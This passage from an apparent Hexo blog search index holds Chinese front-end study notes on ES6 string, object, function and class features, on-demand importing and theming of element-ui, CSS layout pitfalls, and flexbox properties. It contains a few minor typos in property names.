repeat() 123456// 小数会被取整console.log(&apos;x&apos;.repeat(3.6)); // &quot;xxx&quot;// 0 - -1 被视为0console.log(&apos;y&apos;.repeat(-0.1)); // &quot;&quot;// 非数字，转化成数字console.log(&apos;z&apos;.repeat(&apos;z&apos;)); // &quot;&quot; padStart() padEnd() 123456789101112// 头部补全console.log(&apos;x&apos;.padStart(5, &apos;ab&apos;)); // &quot;ababx&quot;// 尾部补全console.log(&apos;x&apos;.padEnd(5, &apos;ab&apos;)); // &quot;xabab&quot;// 原字符串长度，等于或大于指定最小长度，则返回原字符串console.log(&apos;xxx&apos;.padStart(3, &apos;ab&apos;)); // &quot;xxx&quot;// 用来补全的字符串与原字符串，两者的长度之和超过了指定的最小长度，则会截去超出位数的补全字符串console.log(&apos;xxx&apos;.padStart(5, &apos;abcdef&apos;)); // &quot;abxxx&quot;// 省略第二个参数，默认使用空格补全长度console.log(&apos;xxx&apos;.padStart(5)); // &quot; xxx&quot;console.log(&apos;12&apos;.padStart(10, &apos;YYYY-MM-DD&apos;)); // &quot;YYYY-MM-12&quot; 模板字符串里可以嵌套 1234567891011121314151617181920212223let $body = document.querySelector(&apos;body&apos;);const data = [ &#123;first: &apos;wu&apos;, last: &apos;wenhua&apos;&#125;, &#123;first: &apos;xiao&apos;, last: &apos;hua&apos;&#125;];const temp = d =&gt; ` &lt;table&gt; $&#123;d.map(item =&gt; &#123; return ` &lt;tr&gt; &lt;td&gt;$&#123;item.first&#125;&lt;/td&gt; &lt;td&gt;$&#123;item.last&#125;&lt;/td&gt; &lt;/tr&gt; `; &#125;).join(&apos;&apos;)&#125; &lt;/table&gt;`;console.log(temp(data));$body.innerHTML= temp(data); 执行一段字符串 1234let str = `return ` + &apos;`Hello $&#123;name&#125;`&apos;;let func = new Function(&apos;name&apos;, str);console.log(func);console.log(func(&apos;wuwh&apos;)); 标签模板 123456789101112131415161718function passthru(literals, ...values) &#123; let output = &apos;&apos;; let index; for(index = 0; index &lt; values.length; index++) &#123; output += literals[index] + values[index]; &#125; output += literals[index]; return output;&#125;let name = &apos;wen&apos;;let age = 22;let str = passthru`My name is $&#123;name&#125;, I am $&#123;age&#125; old`; // tag函数调用console.log(str); tag函数的第一个参数strings，有一个raw属性，也指向一个数组 12345678tag`abc\nefg`;function tag(str) &#123; console.log(str.raw[0]); // abc\nefg&#125;// 充当模板字符串的处理函数，返回一个斜杠都被转义的字符串console.log(String.raw`abc\nefg`); —— 2018/1/3 ES6之Object把表达式放到方括号里，作为对象的属性名 123456let propKey = &apos;foo&apos;;let obj = &#123; [propKey]: true, [&apos;a&apos; + &apos;b&apos;]: &apos;ab&apos;&#125;;console.log(obj.ab); // &quot;ab&quot; 把表达式放到方括号里，作为对象下的方法名 123456let obj = &#123; [&apos;h&apos; + &apos;ello&apos;]() &#123; return &apos;hi&apos;; &#125;&#125;;console.log(obj.hello()); // &quot;hi&quot; 属性名表达式如果是一个对象，默认情况下会自动转化为字符串[object Object] 12345const propKey = &#123;a: 1&#125;;const obj = &#123; [propKey]: 1&#125;;console.log(obj); getter和setter函数name属性在该方法的属性描述对象的get和set属性上面 12345678const obj = &#123; get foo() &#123;&#125;, set foo(x) &#123;&#125;&#125;;const descriptor = Object.getOwnPropertyDescriptor(obj, &apos;foo&apos;);console.log(descriptor.get.name); // &quot;foo&quot;console.log(descriptor.set.name); // &quot;foo&quot; Function构造函数创造的函数，name属性返回anonymous 1console.log((new Function()).name); // anonymous bind方法创造的函数，name属性返回bound加上原函数的名字 12let doSomething = function() &#123;&#125;;console.log(doSomething.bind().name); // bound doSomething Object.is() 同值相等 不同于运算符（===），一是+0不等于-0，二是NaN等于自身 12console.log(Object.is(+0, -0)); // falseconsole.log(Object.is(NaN, NaN)); // true assign 1234567891011121314151617181920212223242526let a = Object.assign(2);console.log(typeof a);// 由于undefined和null无法转成对象，所以如果它们作为参数，就会报错// Object.assign(undefined);// 非首参，undefined和null无法转成对象就会跳过let b = Object.assign(a, undefined);console.log(a === b); //true// 其他类型的值（数值、字符串和布尔值）不会产生效果let c = Object.assign(a, 2, true, undefined);console.log(c);console.log(a === c); // true// Object.assign拷贝的属性是有限制的，只拷贝源对象的自身属性（不拷贝继承属性），// 也不拷贝不可枚举的属性（enumerable: false）// source对象的foo属性是一个取值函数，Object.assign不会复制这个取值函数，// 只会拿到值以后，将这个值复制过去const source = &#123; get foo() &#123;return 1&#125;&#125;;const target = &#123;&#125;;console.log( Object.assign(target, source) ); // &#123;foo: 1&#125; ES6规定，所有class的原型方法都是不可枚举的 12let cd = Object.getOwnPropertyDescriptor(class &#123; foo() &#123; &#125; &#125;.prototype, &apos;foo&apos;).enumerable;console.log(cd); // false Reflect.ownKeys遍历对象属性类型顺序 数字 -&gt; 字符串 -&gt; Symbol 1console.log(Reflect.ownKeys(&#123; [Symbol()]: 0, a: 1, 0: 2 &#125;)); // [&quot;0&quot;, &quot;a&quot;, Symbol()] ES2017 引入了Object.getOwnPropertyDescriptors方法，返回指定对象所有自身属性（非继承属性）的描述对象 1234567const obj = &#123; foo: 123, [Symbol(&apos;aaa&apos;)]: &apos;aaa&apos;, get bar() &#123; return &apos;abc&apos; &#125;&#125;;console.log(Object.getOwnPropertyDescriptors(obj)); getOwnPropertyDescriptors可应用于将两个对象合并，包括set和get 123456const shallowMerge = (target, source) =&gt; Object.defineProperties( target, Object.getOwnPropertyDescriptors(source));console.log(shallowMerge(&#123;&#125;, &#123; set foo(val) &#123; console.log(val) &#125; &#125;)); 对象上部署proto属性，一下三种方法都能达到效果 1234567891011121314151617181920212223let prot = &#123;&#125;;const obj1 = &#123; __proto__: prot, foo: 123&#125;;const obj2 = Object.assign( Object.create(prot), &#123; foo: 123 &#125;);const obj3 = Object.create( prot, Object.getOwnPropertyDescriptors(&#123; foo: 123 &#125;));console.log(&apos;obj1:&apos;, obj1);console.log(&apos;obj2:&apos;, obj2);console.log(&apos;obj3:&apos;, obj3); super关键字表示原型对象时，只能用在对象的方法之中，用在其他地方都会报错，super等价于Object.getPrototypeOf(this) 123456789101112131415161718const obj = &#123; a: 2, getShow() &#123; return super.show(); &#125;&#125;;Object.setPrototypeOf( obj, &#123; a: 1, show() &#123; return this.a; &#125; &#125;);console.log(obj.getShow()); // 2 拓展运算符的解构赋值，不能复制继承自原型对象的属性 12345678910111213141516let a = &#123; a: 1 &#125;;let b = &#123; b: 2 &#125;;a.__proto__ = b;let &#123; ...c &#125; = a;console.log(c); // &#123;a: 1&#125;console.log(c.b); // undefined// 变量y和z是扩展运算符的解构赋值，只能读取对象o自身的属性const o = Object.create(&#123; x: 1, y: 2 &#125;);o.z = 3;let &#123; x, ...&#123; y, z &#125; &#125; = o;console.log(x); // 1console.log(y); // undefinedconsole.log(z); // 3 —— 2018/1/4 12345678910&#123; // 有默认值的参数不是尾参数，无法只省略该参数 function f(x = 1, y) &#123; return [x, y]; &#125; // f(, 2); // 报错 // 传入undefined，将触发默认值 console.log(f(undefined, null)); // [1, null]&#125; 123456// 指定默认值后，函数的length属性将失真console.log((function (a, b, c = 5) &#123; &#125;).length); // 2console.log((function (...rest) &#123; &#125;).length); // 0// 设置了默认值的参数不是尾参数，那么length属性也不再计入后面的参数了console.log((function (a = 5, b, c) &#123; &#125;).length); // 0 —— 2018/1/5 ES6之function箭头函数不能当作构造函数，原因在于箭头函数内部没有this，而是引用外层的this 12345let Fn = () =&gt; &#123; this.age = &apos;20&apos;;&#125;;let fn = new Fn(); // Uncaught TypeError: Fn is not a constructor 箭头函数不能用作 Generator 函数 12345let g = function* () =&gt; &#123; yield 1;&#125;;console.log( g().next() ); // Uncaught SyntaxError: Unexpected token =&gt; 箭头函数没有自己的this，所以bind方法无效，内部的this指向外部的this 1234567let res = (function() &#123; return [ (() =&gt; this.x).bind(&#123;x: &apos;inner&apos;&#125;)() ];&#125;).call(&#123;x: &apos;outer&apos;&#125;);console.log(&apos;res:&apos;, res); // [&quot;outer&quot;] “尾调用优化”意义：函数执行到最后一步，不保留外层函数的调用帧，只会保存内部函数调用帧，这样节省了内存。注意，只有不再用到外层函数内部变量，内层函数的调用帧才会取代外层函数的调用帧，否则无法进行“尾调用优化”。 1234567function addOne(a) &#123; var one = 1; function inner(b) &#123; return b + one; // 含有外层变量one &#125; return inner(a);&#125; 尾递归的实现，往往需要改写递归函数，确保最后一步只调用自身，做到这一点的方法，就是把所有用到的内部变量改写成函数的参数。 1234567891011// 普通方法递归function Fibonacci(n) &#123; if(n &lt;= 1) &#123; return 1; &#125; return Fibonacci(n - 1) + Fibonacci(n -2);&#125;console.log(&apos;Fibonacci 100:&apos;, Fibonacci(10)); // 89console.log(&apos;Fibonacci 100:&apos;, Fibonacci(100)); // 堆栈溢出 123456789// 尾递归function tailFibonacci(n, ac1 = 1, ac2 = 1) &#123; if(n &lt;= 1) &#123;return ac2&#125;; return tailFibonacci(n - 1, ac2, ac1 + ac2);&#125;console.log(&apos;tailFibonacci 10:&apos;, tailFibonacci(10)); // 89console.log(&apos;tailFibonacci 100:&apos;, tailFibonacci(100)); // 573147844013817200000 ES6之class继承（续）继承Object子类，有一个行为差异，ES6改变了Object构造函数的行为，发现不是通过new Object()形式调用，Object构造函数忽略参数 12345678class NewObj extends Object &#123; constructor() &#123; super(...arguments); &#125;&#125;let o = new NewObj(&#123;attr: true&#125;);console.log(o.attr === true); //false 将多个类的接口“混入”另一个类 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748function mix(...mixins) &#123; class Mix&#123;&#125; for(let mixin of mixins) &#123; copyProperties(Mix, mixin); // 拷贝实例属性 copyProperties(Mix.prototype, mixin.prototype); // 拷贝原型属性 &#125; return Mix;&#125;function copyProperties(target, source) &#123; for(let key of Reflect.ownKeys(source)) &#123; if(key !== &apos;constructor&apos; &amp;&amp; key !== &apos;prototype&apos; &amp;&amp; key !== &apos;name&apos;) &#123; let desc = Object.getOwnPropertyDescriptor(source, key); Object.defineProperty(target, key, desc); &#125; &#125;&#125;class School &#123; constructor() &#123; this.name = &apos;qing&apos;; &#125; getAddress() &#123; return &apos;beijing&apos;; &#125;&#125;class Student &#123; constructor() &#123; this.name = &apos;wang xiao&apos;; &#125; getAddress() &#123; return&apos;shenzhen&apos;; &#125;&#125;class Ins extends mix(School, Student) &#123;&#125;let ins = new Ins();console.log(ins.getAddress()); —— 2018/1/8 关于从页面外部加载js文件 带有src属性&lt;script&gt; 标签之间还包含JavaScript代码，则只会下载并执行外部脚本文件，嵌入的代码会被忽略； 不存在defer和async属性，浏览器就会按照&lt;script&gt;在页面中出现的先后顺序对它们依次进行解析； &lt;script&gt;有defer属性，浏览器会立刻下载，但延时执行（延时到&lt;/html&gt;后执行），HTML5规定按照文件出现的先后顺序执行，先于DOMContentLoaded事件执行； &lt;script&gt;有async属性，浏览器立刻下载，不保证按照先后顺序执行，一定在load事件前执行，但不一定在DOMContentLoaded之前执行； 重绘repaint与重排reflow重绘：当改变那些不会影响元素在网页中的位置样式时，如background-color，border，visibility，浏览器只会用新的样式将元素重绘一次。重排：当改变影响到文本内容或结构，或者元素位置时，重排就会发生。 —— 2018/1/19]]></content>
      <categories>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[element-ui更换主题和按需引入组件]]></title>
    <url>%2F2018%2F08%2F27%2Felement-ui%E6%9B%B4%E6%8D%A2%E4%B8%BB%E9%A2%98%E5%92%8C%E6%8C%89%E9%9C%80%E5%BC%95%E5%85%A5%E7%BB%84%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[前言手上有些项目用的element-ui，刚好有空琢磨一下怎么减小打包文件大小和打包速度方面，为了演示实验，用vue-cli生成初始项目，在这仅对element-ui主题和组件方面来优化。 1vue init webpack vuecli 完整引入完整地将ui和样式引入。 12import ElementUI from 'element-ui'import 'element-ui/lib/theme-chalk/index.css' 在页面简单使用三个组件，看看效果。 1234567891011121314&lt;div class="block"&gt; &lt;span class="demonstration"&gt;区分颜色&lt;/span&gt; &lt;el-rate v-model="value1" :colors="['#99A9BF', '#F7BA2A', '#FF9900']"&gt; &lt;/el-rate&gt;&lt;/div&gt;&lt;el-button type="primary" icon="el-icon-edit"&gt;&lt;/el-button&gt;&lt;el-row&gt; &lt;el-button icon="el-icon-search" circle&gt;&lt;/el-button&gt; &lt;el-button type="primary" icon="el-icon-edit" circle&gt;&lt;/el-button&gt; &lt;el-button type="success" icon="el-icon-check" circle&gt;&lt;/el-button&gt; &lt;el-button type="info" icon="el-icon-message" circle&gt;&lt;/el-button&gt; &lt;el-button type="warning" icon="el-icon-star-off" circle&gt;&lt;/el-button&gt; &lt;el-button type="danger" icon="el-icon-delete" circle&gt;&lt;/el-button&gt;&lt;/el-row&gt; 再看一下打包后的资源大小情况npm run build --report。 1234567891011121314Hash: fa47514a97341329a7c0Version: webpack 3.11.0Time: 20363ms Asset Size Chunks Chunk Names static/fonts/element-icons.6f0a763.ttf 11 kB [emitted] static/js/vendor.5efcf828140d5dbedda9.js 714 kB 0 [emitted] [big] vendor static/js/app.a4a31db472f653b911e7.js 12 kB 1 [emitted] app static/js/manifest.2ae2e69a05c33dfc65f8.js 857 bytes 2 [emitted] manifest static/css/app.f24bb0ae3686720fe2e00c5a2024b8f1.css 185 kB 1 [emitted] appstatic/css/app.f24bb0ae3686720fe2e00c5a2024b8f1.css.map 267 kB [emitted] static/js/vendor.5efcf828140d5dbedda9.js.map 2.73 MB 0 [emitted] vendor static/js/app.a4a31db472f653b911e7.js.map 22.8 kB 1 [emitted] app static/js/manifest.2ae2e69a05c33dfc65f8.js.map 4.97 kB 2 [emitted] manifest index.html 508 bytes [emitted] 发现打包后提取公共模块static/js/vendor.js有714kb 再看一下各个模块占用情况： 发现elment-ui.common.js占用最大。所有模块资源总共有708kb。怎么才能减小打包后的大小呢？很容易就会想到ui的引入和样式的引入中，实际我们只使用了三个组件，却整体都被打包了，在这里引入这三个组件即可。 按需引入组件样式新建一个element-variables.scss文件（为什么是SCSS文件，后面自定义主题会用到）。 12345678/*icon字体路径变量*/$--font-path: &quot;~element-ui/lib/theme-chalk/fonts&quot;;/*按需引入用到的组件的scss文件和基础scss文件*/@import &quot;~element-ui/packages/theme-chalk/src/base.scss&quot;;@import &quot;~element-ui/packages/theme-chalk/src/rate.scss&quot;;@import &quot;~element-ui/packages/theme-chalk/src/button.scss&quot;;@import &quot;~element-ui/packages/theme-chalk/src/row.scss&quot;; 按需引入组件新建一个elementConfig.js文件，将项目用到的element组件引入。 12345678910111213import &#123; Rate, Row, Button&#125; from 'element-ui'export default &#123; install (V) &#123; V.use(Rate) V.use(Button) V.use(Row) &#125;&#125; 第一次优化后打包分析将以上element-variables.scss和elementConfig.js引入到main.js中。 1234import ElementUI from '@/assets/js/elementConfig'import '@/assets/css/element-variables.scss'Vue.use(ElementUI) 貌似上面一切都很顺理成章，打包后大小会减小。 1234567891011121314Hash: 3ba9b74482f121efd3aaVersion: webpack 3.11.0Time: 18854ms Asset Size Chunks Chunk Names static/fonts/element-icons.6f0a763.ttf 11 kB [emitted] static/js/vendor.11c71f168a2d61b547a0.js 714 kB 0 [emitted] [big] vendor static/js/app.dbb5b49dad2d42b3598c.js 11.2 kB 1 [emitted] app static/js/manifest.2ae2e69a05c33dfc65f8.js 857 bytes 2 [emitted] manifest static/css/app.bf52525d6279e7fb87b4db770d119a8d.css 25.7 kB 1 [emitted] appstatic/css/app.bf52525d6279e7fb87b4db770d119a8d.css.map 63 kB [emitted] static/js/vendor.11c71f168a2d61b547a0.js.map 2.73 MB 0 [emitted] vendor static/js/app.dbb5b49dad2d42b3598c.js.map 21 kB 1 [emitted] app static/js/manifest.2ae2e69a05c33dfc65f8.js.map 4.97 kB 2 [emitted] manifest index.html 508 bytes [emitted] 结果可知，static/js/vendor.js还是714kb！ 再看各个模块占用情况： WHAT?竟然模块都没什么变化，岂不是竹篮打水，事与愿违。 再次打包优化尝试后来查到有人同样遇到这个问题，提出一个issues#6362，原来只引入需要的element-ui组件，webpack还是把整体的ui库和样式都打包了，需要一个webpack的babel插件babel-plugin-component，这样才能真正按需引入打包。这块其实被写到官方文档更换 自定义主题 的配置了。 于是npm i babel-pugin-componet -D安装后，在增加.babelrc文件插件配置 123456789101112131415&#123; "presets": [ ["env", &#123; "modules": false, "targets": &#123; "browsers": ["&gt; 1%", "last 2 versions", "not ie &lt;= 8"] &#125; &#125;], "stage-2" ], "plugins": ["transform-vue-jsx", "transform-runtime", ["component", &#123; "libraryName": "element-ui", "styleLibraryName": "theme-chalk" &#125;]]&#125; 页面运行正常，再次打包。 1234567891011121314Hash: 9cc71dead6d7646c9ed4Version: webpack 3.11.0Time: 9963ms Asset Size Chunks Chunk Names static/fonts/element-icons.6f0a763.ttf 11 kB [emitted] static/js/app.77c0883f4f0fc0bf5cbc.js 11.4 kB 0 [emitted] app static/js/vendor.942130fd13274b901889.js 126 kB 1 [emitted] vendor static/js/manifest.2ae2e69a05c33dfc65f8.js 857 bytes 2 [emitted] manifest static/css/app.b140020e5dbee406ae70780b43ba7ddc.css 27.8 kB 0 [emitted] appstatic/css/app.b140020e5dbee406ae70780b43ba7ddc.css.map 91.4 kB [emitted] static/js/app.77c0883f4f0fc0bf5cbc.js.map 21.1 kB 0 [emitted] app static/js/vendor.942130fd13274b901889.js.map 613 kB 1 [emitted] vendor static/js/manifest.2ae2e69a05c33dfc65f8.js.map 4.97 kB 2 [emitted] manifest index.html 508 bytes [emitted] static/js/vendor.js确实变小了，126kB。再来看各个模块分析图。 模块总共135.03KB，少了5倍！ 更换主题element-ui的theme-chalk使用SCSS编写，如果在自己的项目中也是用SCSS，那么可以直接在项目中改变样式变量，因此可以在前面新建的element-variables.scss文件用新的主题颜色变量覆盖即可。 12345/*主题颜色变量*/$--color-primary: #f0f;/*icon字体路径变量*/$--font-path: &quot;~element-ui/lib/theme-chalk/fonts&quot;; 可能你已经注意到了，这里没有分别引入用到的组件样式了，是因为babel-plugin-component帮我们按需引入了对应的样式。 现在我们的主题就变成了 如果你没有用到SCSS，可以用element-theme主题编译插件，生成自定义主题文件引入。 完~ps：个人见解有限，欢迎指正。]]></content>
      <categories>
        <category>vue</category>
      </categories>
      <tags>
        <tag>vue</tag>
        <tag>element-ui</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[css中的一些坑]]></title>
    <url>%2F2018%2F08%2F27%2Fcss%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9D%91%2F</url>
    <content type="text"><![CDATA[1、如果子元素全部设置为浮动，则父元素是塌陷的 在元素末尾加块级空元素设置clear:both； 1234.last &#123; display: block; clear: both;&#125; 在父级容器设置before/after模拟一个块级空元素 12345.clearfix:after &#123; content: ""; display: block; clear: both;&#125; 父级容器直接设置overflow: auto/hidden; 2、普通文档流中块级垂直外边距合并解决办法：用padding代替，或改成inline-block，或改成float，或绝对定位 3、使用transition闪屏12345.demo &#123; -webkit-transform-style: preserve-3d; -webkit-backface-visibility: hidden; -webkit-perspective: 1000&#125; 过渡动画在没有启动硬件加速的情况下，会出现抖动现象，解决方案：用translated3d、translateZ、transform自动启动硬件加速，即改为： 1234.demo &#123; -webkit-transform: translated3d(0,0,0); transform: translated3d(0,0,0);&#125; ps:硬件加速导致cpu性能占用增加，电池电量消耗加大 4、超出内容用”…”表示123&lt;div class="line-clamp"&gt;来点展示内容，来点展示内容，来点展示内容，来点展示内容，来点展示内容，来点展示内容，来点展示内容，来点展示内容，来点展示内容，来点展示内容&lt;/div&gt; 1234567.line-clamp &#123; width: 300px; display: -webkit-box; -webkit-box-orient: vertical; -webkit-line-clamp: 3; overflow: hidden;&#125; 说明： -webkit-line-clamp用来限制在一个块元素显示的文本的行数 display: -webkit-box; 必须结合的属性 ，将对象作为弹性伸缩盒子模型显示 -webkit-box-orient 必须结合的属性 ，设置或检索伸缩盒对象的子元素的排列方式 缺点：只有移动端和webkit浏览器支持 还不够，最后末尾最好有点渐变到”…” 12345678910111213141516.line-clamp &#123; width: 300px; line-height: 20px; height: 40px; overflow: hidden; position: relative;&#125;.line-clamp:after &#123; content: "..."; position: absolute; bottom: 0; right: 0; padding-left: 40px; background: linear-gradient(to right, transparent, #fff 55%);&#125; 说明： 将height设置为line-height整数倍，防止超出文字露出 ie10+才支持linear-gradient属性 缺点： 当文字少于区域大小时，也会出现省略号 输入框placeholder文字带颜色1234567891011121314151617input::-webkit-input-placeholder &#123; /* WebKit browsers */ font-size: 14px; color: #009a61;&#125;input::-moz-placeholder &#123; /* Mozilla Firefox 19+ */ font-size: 14px; color: #009a61;&#125;input:-ms-input-placeholder &#123; /* Internet Explorer 10+ */ font-size: 14px; color: #009a61;&#125;]]></content>
      <categories>
        <category>css</category>
      </categories>
      <tags>
        <tag>css</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[flex 布局]]></title>
    <url>%2F2018%2F07%2F23%2Fflex%E5%B8%83%E5%B1%80%2F</url>
    <content type="text"><![CDATA[flex弹性布局相关属性 详细参考：阮一峰博客 1.flex-direction 定义沿水平或主轴方向 row（默认值）：主轴为水平方向，起点在左端。 row-reverse：主轴为水平方向，起点在右端。 column：主轴为垂直方向，起点在上沿。 column-reverse：主轴为垂直方向，起点在下沿。 2.flex-wrap 定义换行方式 nowrap（默认值）: 不换行 wrap: 换行，第一行在上面 wrap-reverse: 换行，第一行在上面 3.flex-flow flex-flow 属性是flex-direction属性和flex-wrap的简写，默认flex-flow: row nowrap 4.flex-content 定义了在主轴上对其方式 flex-start左对齐 flex-end 右对齐 center 居中 space-between 两端对齐，项目之间得间隔相等 space-around 每个项目两侧得间隔相等，所以，项目之间得间隔比项目与边框的间隔大一倍 5.align-item 定义项目在交叉轴上如何对齐 flex-start 交叉轴起点对齐 flex-end 交叉轴终点对齐 flex-center 交叉轴中点对齐 flex-baseline 项目中第一行文字基线对齐 stretch（默认值） 项目中未设置高度或设为auto，将占满容器高度 6. align-content align-content定义了多根轴线的对齐方式，如果项目只有一根轴线，该属性不起作用 flex-start 与交叉轴的起点对齐 flex-end 与交叉轴的终点对齐 space-between 与交叉轴两端对齐，轴线之间的间隔平均分布 space-around 每根轴线两侧的间隔都相等，所以，轴线之间与边框的间隔大一倍 space-stretch（默认值） 如果不设置高度，轴线占满整个交叉轴 7.项目的属性 order属性定义项目的排列顺序。数值越小，排列越靠前，默认为0。 flex-grow属性定义项目的放大比例，默认为0，即如果存在剩余空间，也不放大。如果所有项目的flex-grow属性都为1，则它们将等分剩余空间（如果有的话）。如果一个项目的flex-grow属性为2，其他项目都为1，则前者占据的剩余空间将比其他项多一倍。 flex-shrink属性定义了项目的缩小比例，默认为1，即如果空间不足，该项目将缩小。如果所有项目的flex-shrink属性都为1，当空间不足时，都将等比例缩小。如果一个项目的flex-shrink属性为0，其他项目都为1，则空间不足时，前者不缩小。 flex-basis属性定义了在分配多余空间之前，项目占据的主轴空间（main size）。浏览器根据这个属性，计算主轴是否有多余空间。它的默认值为auto，即项目的本来大小。 flex属性是flex-grow, flex-shrink 和 flex-basis的简写，默认值为0 1 auto。后两个属性可选。该属性有两个快捷值：auto (1 1 auto) 和 none (0 0 auto)。 8.align-self align-self属性允许单个项目有与其他项目不一样的对齐方式，可覆盖align-items属性。默认值为auto，表示继承父元素的align-items属性，如果没有父元素，则等同于stretch。]]></content>
      <categories>
        <category>css</category>
      </categories>
      <tags>
        <tag>css</tag>
      </tags>
  </entry>
</search>
